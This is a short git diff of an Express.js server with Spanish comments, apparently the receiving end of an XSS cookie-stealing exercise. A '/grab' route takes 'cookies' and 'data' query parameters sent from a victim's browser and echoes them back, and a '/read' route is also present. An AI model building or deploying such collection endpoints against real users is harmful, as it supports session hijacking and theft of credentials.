@@ -9,18 +9,19 @@ app.get('/', (req, res)=>{
     res.send(document.cookie)
 });
 
-app.get('/cookies', (req, res) => {
+app.get('/grab', (req, res) => {
+    
+    //Guardamos la data que el usuario nos manda en una variable global
+    const data = req.query.data
+    
     //Recibir las cookies que  nos manda el usuario
     const cookies = req.query.cookies
 
-    res.send(escapeHtml(cookies));
-})
+    //txt += escapeHtml(data) + ""
+    //res.send(escapeHtml(data));
 
-app.get('/grab', (req, res) => {
-    const data = req.query.data
-    //Guardamos la data que el usuario nos manda en una variable global
-    txt += escapeHtml(data) + ""
-    res.send(escapeHtml(data));
+    //Mostramos las cookies
+    res.send(escapeHtml(cookies));
 })
 
 app.get('/read', (req, res) =>{
